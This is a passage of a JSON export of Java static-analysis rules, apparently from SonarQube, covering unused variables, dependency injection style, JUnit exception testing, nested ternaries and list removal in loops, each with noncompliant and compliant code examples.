            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "mockito",
                "tests"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "debtOverloaded": false,
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1481",
            "repo": "java",
            "name": "Unused local variables should be removed",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>If a local variable is declared but not used, it is dead code and should be removed. Doing so will improve maintainability because developers will\nnot wonder what the variable is used for.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic int numberOfMinutes(int hours) {\n  int seconds = 0;   // seconds is never used\n  return hours * 60;\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic int numberOfMinutes(int hours) {\n  return hours * 60;\n}\n</pre>",
            "mdDesc": "<p>If a local variable is declared but not used, it is dead code and should be removed. Doing so will improve maintainability because developers will\nnot wonder what the variable is used for.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic int numberOfMinutes(int hours) {\n  int seconds = 0;   // seconds is never used\n  return hours * 60;\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic int numberOfMinutes(int hours) {\n  return hours * 60;\n}\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "unused"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S3306",
            "repo": "java",
            "name": "Constructor injection should be used instead of field injection",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Field injection seems like a tidy way to get your classes what they need to do their jobs, but it's really a <code>NullPointerException</code>\nwaiting to happen unless all your class constructors are <code>private</code>. That's because any class instances that are constructed by callers,\nrather than instantiated by a Dependency Injection framework compliant with the JSR-330 (Spring, Guice, ...), won't have the ability to perform the\nfield injection.</p>\n<p>Instead <code>@Inject</code> should be moved to the constructor and the fields required as constructor parameters.</p>\n<p>This rule raises an issue when classes with non-<code>private</code> constructors (including the default constructor) use field injection.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass MyComponent {  // Anyone can call the default constructor\n\n  @Inject MyCollaborator collaborator;  // Noncompliant\n\n  public void myBusinessMethod() {\n    collaborator.doSomething();  // this will fail in classes new-ed by a caller\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nclass MyComponent {\n\n  private final MyCollaborator collaborator;\n\n  @Inject\n  public MyComponent(MyCollaborator collaborator) {\n    Assert.notNull(collaborator, \"MyCollaborator must not be null!\");\n    this.collaborator = collaborator;\n  }\n\n  public void myBusinessMethod() {\n    collaborator.doSomething();\n  }\n}\n</pre>",
            "mdDesc": "<p>Field injection seems like a tidy way to get your classes what they need to do their jobs, but it's really a <code>NullPointerException</code>\nwaiting to happen unless all your class constructors are <code>private</code>. That's because any class instances that are constructed by callers,\nrather than instantiated by a Dependency Injection framework compliant with the JSR-330 (Spring, Guice, ...), won't have the ability to perform the\nfield injection.</p>\n<p>Instead <code>@Inject</code> should be moved to the constructor and the fields required as constructor parameters.</p>\n<p>This rule raises an issue when classes with non-<code>private</code> constructors (including the default constructor) use field injection.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass MyComponent {  // Anyone can call the default constructor\n\n  @Inject MyCollaborator collaborator;  // Noncompliant\n\n  public void myBusinessMethod() {\n    collaborator.doSomething();  // this will fail in classes new-ed by a caller\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nclass MyComponent {\n\n  private final MyCollaborator collaborator;\n\n  @Inject\n  public MyComponent(MyCollaborator collaborator) {\n    Assert.notNull(collaborator, \"MyCollaborator must not be null!\");\n    this.collaborator = collaborator;\n  }\n\n  public void myBusinessMethod() {\n    collaborator.doSomething();\n  }\n}\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "design",
                "jee",
                "pitfall",
                "spring"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S4517",
            "repo": "java",
            "name": "InputSteam.read() implementation should not return a signed byte",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>According to the Java documentation, any implementation of the <code>InputSteam.read()</code> method is supposed to read the next byte of data from\nthe input stream. The value byte must be an <code>int</code> in the range 0 to 255. If no byte is available because the end of the stream has been\nreached, the value -1 is returned.</p>\n<p>But in Java, the <code>byte</code> primitive data type is an 8-bit signed two's complement integer. It has a minimum value of -128 and a maximum\nvalue of 127. So by contract, the implementation of an <code>InputSteam.read()</code> method should never directly return a <code>byte</code>\nprimitive data type. A conversion into an unsigned byte must be done before by applying a bitmask.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n@Override\npublic int read() throws IOException {\n  if (pos == buffer.length()) {\n    return -1;\n  }\n  return buffer.getByte(pos++); // Noncompliant, a signed byte value is returned\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n@Override\npublic int read() throws IOException {\n  if (pos == buffer.length()) {\n    return -1;\n  }\n  return buffer.getByte(pos++) &amp; 0xFF; // The 0xFF bitmask is applied\n}\n</pre>",
            "mdDesc": "<p>According to the Java documentation, any implementation of the <code>InputSteam.read()</code> method is supposed to read the next byte of data from\nthe input stream. The value byte must be an <code>int</code> in the range 0 to 255. If no byte is available because the end of the stream has been\nreached, the value -1 is returned.</p>\n<p>But in Java, the <code>byte</code> primitive data type is an 8-bit signed two's complement integer. It has a minimum value of -128 and a maximum\nvalue of 127. So by contract, the implementation of an <code>InputSteam.read()</code> method should never directly return a <code>byte</code>\nprimitive data type. A conversion into an unsigned byte must be done before by applying a bitmask.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n@Override\npublic int read() throws IOException {\n  if (pos == buffer.length()) {\n    return -1;\n  }\n  return buffer.getByte(pos++); // Noncompliant, a signed byte value is returned\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n@Override\npublic int read() throws IOException {\n  if (pos == buffer.length()) {\n    return -1;\n  }\n  return buffer.getByte(pos++) &amp; 0xFF; // The 0xFF bitmask is applied\n}\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S2148",
            "repo": "java",
            "name": "Underscores should be used to make large numbers readable",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Beginning with Java 7, it is possible to add underscores ('_') to numeric literals to enhance readability. The addition of underscores in this\nmanner has no semantic meaning, but makes it easier for maintainers to understand the code.</p>\n<p>The number of digits to the left of a decimal point needed to trigger this rule varies by base.</p>\n<table>\n  <tbody>\n    <tr>\n      <th>Base</th>\n      <th> Minimum digits</th>\n    </tr>\n    <tr>\n      <td>binary</td>\n      <td> 9 </td>\n    </tr>\n    <tr>\n      <td>octal</td>\n      <td> 9 </td>\n    </tr>\n    <tr>\n      <td>decimal</td>\n      <td> 6 </td>\n    </tr>\n    <tr>\n      <td>hexadecimal</td>\n      <td> 9 </td>\n    </tr>\n  </tbody>\n</table>\n<p>It is only the presence of underscores, not their spacing that is scrutinized by this rule.</p>\n<p><strong>Note</strong> that this rule is automatically disabled when the project's <code>sonar.java.source</code> is lower than <code>7</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nint i = 10000000;  // Noncompliant; is this 10 million or 100 million?\nint  j = 0b01101001010011011110010101011110;  // Noncompliant\nlong l = 0x7fffffffffffffffL;  // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nint i = 10_000_000;\nint  j = 0b01101001_01001101_11100101_01011110;\nlong l = 0x7fff_ffff_ffff_ffffL;\n</pre>",
            "mdDesc": "<p>Beginning with Java 7, it is possible to add underscores ('_') to numeric literals to enhance readability. The addition of underscores in this\nmanner has no semantic meaning, but makes it easier for maintainers to understand the code.</p>\n<p>The number of digits to the left of a decimal point needed to trigger this rule varies by base.</p>\n<table>\n  <tbody>\n    <tr>\n      <th>Base</th>\n      <th> Minimum digits</th>\n    </tr>\n    <tr>\n      <td>binary</td>\n      <td> 9 </td>\n    </tr>\n    <tr>\n      <td>octal</td>\n      <td> 9 </td>\n    </tr>\n    <tr>\n      <td>decimal</td>\n      <td> 6 </td>\n    </tr>\n    <tr>\n      <td>hexadecimal</td>\n      <td> 9 </td>\n    </tr>\n  </tbody>\n</table>\n<p>It is only the presence of underscores, not their spacing that is scrutinized by this rule.</p>\n<p><strong>Note</strong> that this rule is automatically disabled when the project's <code>sonar.java.source</code> is lower than <code>7</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nint i = 10000000;  // Noncompliant; is this 10 million or 100 million?\nint  j = 0b01101001010011011110010101011110;  // Noncompliant\nlong l = 0x7fffffffffffffffL;  // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nint i = 10_000_000;\nint  j = 0b01101001_01001101_11100101_01011110;\nlong l = 0x7fff_ffff_ffff_ffffL;\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "convention"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S5777",
            "repo": "java",
            "name": "Exception testing via JUnit @Test annotation should be avoided",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>When testing exception via <code>@Test</code> annotation, having additional assertions inside that test method can be problematic because any code\nafter the raised exception will not be executed. It will prevent you to test the state of the program after the raised exception and, at worst, make\nyou&nbsp;misleadingly think that it is executed.</p>\n<p>You should consider moving any assertions into a separate test method where possible, or using <a\nhref=\"https://github.com/junit-team/junit4/wiki/Exception-testing#using-assertthrows-method\">org.junit.Assert.assertThrows</a> instead.</p>\n<p>Alternatively, you could use <a href=\"https://github.com/junit-team/junit4/wiki/Exception-testing#trycatch-idiom\">try-catch idiom</a> for JUnit\nversion &lt; 4.13 or if your project does not support lambdas.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n@Test(expected = IndexOutOfBoundsException.class)\npublic void testShouldFail() {\n  get();\n  // This test pass since execution will never get past this line.\n  Assert.assertEquals(0, 1);\n}\n\nprivate Object get() {\n  throw new IndexOutOfBoundsException();\n}\n</pre>\n<h2>Compliant Solution</h2>\n<ul>\n  <li> For JUnit &gt;= 4.13, use <a\n  href=\"https://github.com/junit-team/junit4/wiki/Exception-testing#using-assertthrows-method\">org.junit.Assert.assertThrows</a>: </li>\n</ul>\n<pre>\n// This test correctly fails.\n@Test\npublic void testToString() {\n    Object obj = get();\n    Assert.assertThrows(IndexOutOfBoundsException.class, () -&gt; obj.toString());\n    Assert.assertEquals(0, 1);\n}\n</pre>\n<ul>\n  <li> For JUnit &lt; 4.13, use the <a href=\"https://github.com/junit-team/junit4/wiki/Exception-testing#trycatch-idiom\">try-catch idiom</a>: </li>\n</ul>\n<pre>\n@Test\npublic void testShouldFail() {\n    Object obj = get();\n    try {\n        obj.toString();\n        Assert.fail(\"Expected an IndexOutOfBoundsException to be thrown\");\n    } catch (IndexOutOfBoundsException e) {}\n    Assert.assertEquals(0, 1); // Correctly fails.\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://github.com/junit-team/junit4/wiki/Exception-testing\">JUnit exception testing documentation</a> </li>\n</ul>",
            "mdDesc": "<p>When testing exception via <code>@Test</code> annotation, having additional assertions inside that test method can be problematic because any code\nafter the raised exception will not be executed. It will prevent you to test the state of the program after the raised exception and, at worst, make\nyou&nbsp;misleadingly think that it is executed.</p>\n<p>You should consider moving any assertions into a separate test method where possible, or using <a\nhref=\"https://github.com/junit-team/junit4/wiki/Exception-testing#using-assertthrows-method\">org.junit.Assert.assertThrows</a> instead.</p>\n<p>Alternatively, you could use <a href=\"https://github.com/junit-team/junit4/wiki/Exception-testing#trycatch-idiom\">try-catch idiom</a> for JUnit\nversion &lt; 4.13 or if your project does not support lambdas.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n@Test(expected = IndexOutOfBoundsException.class)\npublic void testShouldFail() {\n  get();\n  // This test pass since execution will never get past this line.\n  Assert.assertEquals(0, 1);\n}\n\nprivate Object get() {\n  throw new IndexOutOfBoundsException();\n}\n</pre>\n<h2>Compliant Solution</h2>\n<ul>\n  <li> For JUnit &gt;= 4.13, use <a\n  href=\"https://github.com/junit-team/junit4/wiki/Exception-testing#using-assertthrows-method\">org.junit.Assert.assertThrows</a>: </li>\n</ul>\n<pre>\n// This test correctly fails.\n@Test\npublic void testToString() {\n    Object obj = get();\n    Assert.assertThrows(IndexOutOfBoundsException.class, () -&gt; obj.toString());\n    Assert.assertEquals(0, 1);\n}\n</pre>\n<ul>\n  <li> For JUnit &lt; 4.13, use the <a href=\"https://github.com/junit-team/junit4/wiki/Exception-testing#trycatch-idiom\">try-catch idiom</a>: </li>\n</ul>\n<pre>\n@Test\npublic void testShouldFail() {\n    Object obj = get();\n    try {\n        obj.toString();\n        Assert.fail(\"Expected an IndexOutOfBoundsException to be thrown\");\n    } catch (IndexOutOfBoundsException e) {}\n    Assert.assertEquals(0, 1); // Correctly fails.\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://github.com/junit-team/junit4/wiki/Exception-testing\">JUnit exception testing documentation</a> </li>\n</ul>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "junit",
                "tests"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "debtOverloaded": false,
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S3358",
            "repo": "java",
            "name": "Ternary operators should not be nested",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Just because you <em>can</em> do something, doesn't mean you should, and that's the case with nested ternary operations. Nesting ternary operators\nresults in the kind of code that may seem clear as day when you write it, but six months later will leave maintainers (or worse - future you)\nscratching their heads and cursing.</p>\n<p>Instead, err on the side of clarity, and use another line to express the nested operation as a separate statement.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic String getReadableStatus(Job j) {\n  return j.isRunning() ? \"Running\" : j.hasErrors() ? \"Failed\" : \"Succeeded\";  // Noncompliant\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic String getReadableStatus(Job j) {\n  if (j.isRunning()) {\n    return \"Running\";\n  }\n  return j.hasErrors() ? \"Failed\" : \"Succeeded\";\n}\n</pre>",
            "mdDesc": "<p>Just because you <em>can</em> do something, doesn't mean you should, and that's the case with nested ternary operations. Nesting ternary operators\nresults in the kind of code that may seem clear as day when you write it, but six months later will leave maintainers (or worse - future you)\nscratching their heads and cursing.</p>\n<p>Instead, err on the side of clarity, and use another line to express the nested operation as a separate statement.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic String getReadableStatus(Job j) {\n  return j.isRunning() ? \"Running\" : j.hasErrors() ? \"Failed\" : \"Succeeded\";  // Noncompliant\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic String getReadableStatus(Job j) {\n  if (j.isRunning()) {\n    return \"Running\";\n  }\n  return j.hasErrors() ? \"Failed\" : \"Succeeded\";\n}\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "confusing"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S5776",
            "repo": "java",
            "name": "Exception testing via JUnit ExpectedException rule should not be mixed with other assertions",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>When testing exception via <code>org.junit.rules.ExpectedException</code> any code after the raised exception will not be executed, so adding\nsubsequent assertions is wrong and misleading. This rule raises an issue when an assertion is done after the \"expect(...)\" invocation, only the code\nthrowing the expected exception should be after \"expect(...)\".</p>\n<p>You should consider using <a\nhref=\"https://github.com/junit-team/junit4/wiki/Exception-testing#using-assertthrows-method\">org.junit.Assert.assertThrows</a> instead, it's available\nsince JUnit 4.13 and it allows additional subsequent assertions.</p>\n<p> Alternatively, you could use <a href=\"https://github.com/junit-team/junit4/wiki/Exception-testing#trycatch-idiom\">try-catch idiom</a> for JUnit\nversion &lt; 4.13 or if your project does not support lambdas.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n@Rule\npublic ExpectedException thrown = ExpectedException.none();\n\n@Test\npublic void test() throws IndexOutOfBoundsException {\n  thrown.expect(IndexOutOfBoundsException.class); // Noncompliant\n  Object o = get();\n  // This test pass since execution will never get past this line.\n  Assert.assertEquals(0, 1);\n}\n\nprivate Object get() {\n  throw new IndexOutOfBoundsException();\n}\n</pre>\n<h2>Compliant Solution</h2>\n<ul>\n  <li> For JUnit &gt;= 4.13, use <a\n  href=\"https://github.com/junit-team/junit4/wiki/Exception-testing#using-assertthrows-method\">org.junit.Assert.assertThrows</a>: </li>\n</ul>\n<pre>\nAssert.assertThrows(IndexOutOfBoundsException.class, () -&gt; get());\n// This test correctly fails.\nAssert.assertEquals(0, 1);\n</pre>\n<ul>\n  <li> For JUnit &lt; 4.13, use the <a href=\"https://github.com/junit-team/junit4/wiki/Exception-testing#trycatch-idiom\">try-catch idiom</a>: </li>\n</ul>\n<pre>\ntry {\n  get();\n  Assert.fail(\"Expected an IndexOutOfBoundsException to be thrown\");\n} catch (IndexOutOfBoundsException e) {}\nAssert.assertEquals(0, 1); // Correctly fails.\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://github.com/junit-team/junit4/wiki/Exception-testing\">JUnit exception testing documentation</a> </li>\n</ul>",
            "mdDesc": "<p>When testing exception via <code>org.junit.rules.ExpectedException</code> any code after the raised exception will not be executed, so adding\nsubsequent assertions is wrong and misleading. This rule raises an issue when an assertion is done after the \"expect(...)\" invocation, only the code\nthrowing the expected exception should be after \"expect(...)\".</p>\n<p>You should consider using <a\nhref=\"https://github.com/junit-team/junit4/wiki/Exception-testing#using-assertthrows-method\">org.junit.Assert.assertThrows</a> instead, it's available\nsince JUnit 4.13 and it allows additional subsequent assertions.</p>\n<p> Alternatively, you could use <a href=\"https://github.com/junit-team/junit4/wiki/Exception-testing#trycatch-idiom\">try-catch idiom</a> for JUnit\nversion &lt; 4.13 or if your project does not support lambdas.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n@Rule\npublic ExpectedException thrown = ExpectedException.none();\n\n@Test\npublic void test() throws IndexOutOfBoundsException {\n  thrown.expect(IndexOutOfBoundsException.class); // Noncompliant\n  Object o = get();\n  // This test pass since execution will never get past this line.\n  Assert.assertEquals(0, 1);\n}\n\nprivate Object get() {\n  throw new IndexOutOfBoundsException();\n}\n</pre>\n<h2>Compliant Solution</h2>\n<ul>\n  <li> For JUnit &gt;= 4.13, use <a\n  href=\"https://github.com/junit-team/junit4/wiki/Exception-testing#using-assertthrows-method\">org.junit.Assert.assertThrows</a>: </li>\n</ul>\n<pre>\nAssert.assertThrows(IndexOutOfBoundsException.class, () -&gt; get());\n// This test correctly fails.\nAssert.assertEquals(0, 1);\n</pre>\n<ul>\n  <li> For JUnit &lt; 4.13, use the <a href=\"https://github.com/junit-team/junit4/wiki/Exception-testing#trycatch-idiom\">try-catch idiom</a>: </li>\n</ul>\n<pre>\ntry {\n  get();\n  Assert.fail(\"Expected an IndexOutOfBoundsException to be thrown\");\n} catch (IndexOutOfBoundsException e) {}\nAssert.assertEquals(0, 1); // Correctly fails.\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://github.com/junit-team/junit4/wiki/Exception-testing\">JUnit exception testing documentation</a> </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "junit",
                "tests"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "debtOverloaded": false,
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S5413",
            "repo": "java",
            "name": "'List.remove()' should not be used in ascending 'for' loops",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>When <code>List.remove()</code> is called it will shrink the list. If this is done inside the ascending loop iterating through all elements it will\nskip the element after the removed index.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nvoid removeFrom(List&lt;String&gt; list) {\n  // expected: iterate over all the elements of the list\n  for (int i = 0; i &lt; list.size(); i++) {\n    if (list.get(i).isEmpty()) {\n      // actual: remaining elements are shifted, so the one immediately following will be skipped\n      list.remove(i); // Noncompliant\n    }\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>You can either adjust the loop index to account for the change in the size of the list</p>\n<pre>\nstatic void removeFrom(List&lt;String&gt; list) {\n    // expected: iterate over all the elements of the list\n    for (int i = 0; i &lt; list.size(); i++) {\n      if (list.get(i).isEmpty()) {\n        // actual: remaining elements are shifted, so the one immediately following will be skipped\n        list.remove(i);\n        i--;\n      }\n    }\n  }\n</pre>\n<p>Or preferably it's probably better to rely on Java 8's <code>removeIf</code> method</p>\n<pre>\n static void removeFrom(List&lt;String&gt; list) {\n    list.removeIf(String::isEmpty);\n  }\n</pre>\n<p>&nbsp;</p>\n<h2>Exceptions</h2>\n<p>The descending loop doesn't have this issue, because the index will be correct when we loop in descending order</p>\n<pre>\nvoid removeFrom(List&lt;String&gt; list) {\n  for (int i = list.size() - 1; i &gt;= 0; i--) {\n    if (list.get(i).isEmpty()) {\n      list.remove(i);\n    }\n  }\n}\n</pre>\n<p>&nbsp;</p>",
            "mdDesc": "<p>When <code>List.remove()</code> is called it will shrink the list. If this is done inside the ascending loop iterating through all elements it will\nskip the element after the removed index.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nvoid removeFrom(List&lt;String&gt; list) {\n  // expected: iterate over all the elements of the list\n  for (int i = 0; i &lt; list.size(); i++) {\n    if (list.get(i).isEmpty()) {\n      // actual: remaining elements are shifted, so the one immediately following will be skipped\n      list.remove(i); // Noncompliant\n    }\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>You can either adjust the loop index to account for the change in the size of the list</p>\n<pre>\nstatic void removeFrom(List&lt;String&gt; list) {\n    // expected: iterate over all the elements of the list\n    for (int i = 0; i &lt; list.size(); i++) {\n      if (list.get(i).isEmpty()) {\n        // actual: remaining elements are shifted, so the one immediately following will be skipped\n        list.remove(i);\n        i--;\n      }\n    }\n  }\n</pre>\n<p>Or preferably it's probably better to rely on Java 8's <code>removeIf</code> method</p>\n<pre>\n static void removeFrom(List&lt;String&gt; list) {\n    list.removeIf(String::isEmpty);\n  }\n</pre>\n<p>&nbsp;</p>\n<h2>Exceptions</h2>\n<p>The descending loop doesn't have this issue, because the index will be correct when we loop in descending order</p>\n<pre>\nvoid removeFrom(List&lt;String&gt; list) {\n  for (int i = list.size() - 1; i &gt;= 0; i--) {\n    if (list.get(i).isEmpty()) {\n      list.remove(i);\n    }\n  }\n}\n</pre>\n<p>&nbsp;</p>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S5779",
            "repo": "java",
            "name": "Assertion methods should not be used within the try block of a try-catch catching an Error",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Assertion methods&nbsp;are throwing a \"<code>java.lang.AssertionError</code>\". If this call is done within the try block of a try-catch cathing a\nsimilar error, you should make sure to test some properties of the exception. Otherwise, the assertion will never fail.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n@Test\npublic void should_throw_assertion_error() {\n  try {\n    throwAssertionError();\n    Assert.fail(\"Expected an AssertionError!\"); // Noncompliant, the AssertionError will be caught and the test will never fail.\n  } catch (AssertionError e) {}\n}\n\nprivate void throwAssertionError() {\n  throw new AssertionError(\"My assertion error\");\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nassertThrows(AssertionError.class, () -&gt; throwAssertionError());\n</pre>\n<pre>\ntry {\n   throwAssertionError();\n   Assert.fail(\"Expected an AssertionError!\"); // Compliant, we made sure to test that the correct error is raised\n } catch (AssertionError e) {\n   Assert.assertThat(e.getMessage(), is(\"My assertion error\"));\n }\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://github.com/junit-team/junit4/wiki/Exception-testing\">JUnit 4 exception testing documentation</a> </li>\n</ul>",
            "mdDesc": "<p>Assertion methods&nbsp;are throwing a \"<code>java.lang.AssertionError</code>\". If this call is done within the try block of a try-catch cathing a\nsimilar error, you should make sure to test some properties of the exception. Otherwise, the assertion will never fail.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n@Test\npublic void should_throw_assertion_error() {\n  try {\n    throwAssertionError();\n    Assert.fail(\"Expected an AssertionError!\"); // Noncompliant, the AssertionError will be caught and the test will never fail.\n  } catch (AssertionError e) {}\n}\n\nprivate void throwAssertionError() {\n  throw new AssertionError(\"My assertion error\");\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nassertThrows(AssertionError.class, () -&gt; throwAssertionError());\n</pre>\n<pre>\ntry {\n   throwAssertionError();\n   Assert.fail(\"Expected an AssertionError!\"); // Compliant, we made sure to test that the correct error is raised\n } catch (AssertionError e) {\n   Assert.assertThat(e.getMessage(), is(\"My assertion error\"));\n }\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://github.com/junit-team/junit4/wiki/Exception-testing\">JUnit 4 exception testing documentation</a> </li>\n</ul>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "junit",
                "tests"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "debtOverloaded": false,
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S2388",
            "repo": "java",
            "name": "Inner class calls to super class methods should be unambiguous",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>When an inner class extends another class, and both its outer class and its parent class have a method with the same name, calls to that method can\nbe confusing. The compiler will resolve the call to the superclass method, but maintainers may be confused, so the superclass method should be called\nexplicitly, using <code>super.</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Parent {\n  public void foo() { ... }\n}\n\npublic class Outer {\n\n  public void foo() { ... }\n\n  public class Inner extends Parent {\n\n    public void doTheThing() {\n      foo();  // Noncompliant; was Outer.this.foo() intended instead?\n      // ...\n    }\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class Parent {\n  public void foo() { ... }\n}\n\npublic class Outer {\n\n  public void foo() { ... }\n\n  public class Inner extends Parent {\n\n    public void doTheThing() {\n      super.foo();\n      // ...\n    }\n  }\n}\n</pre>",
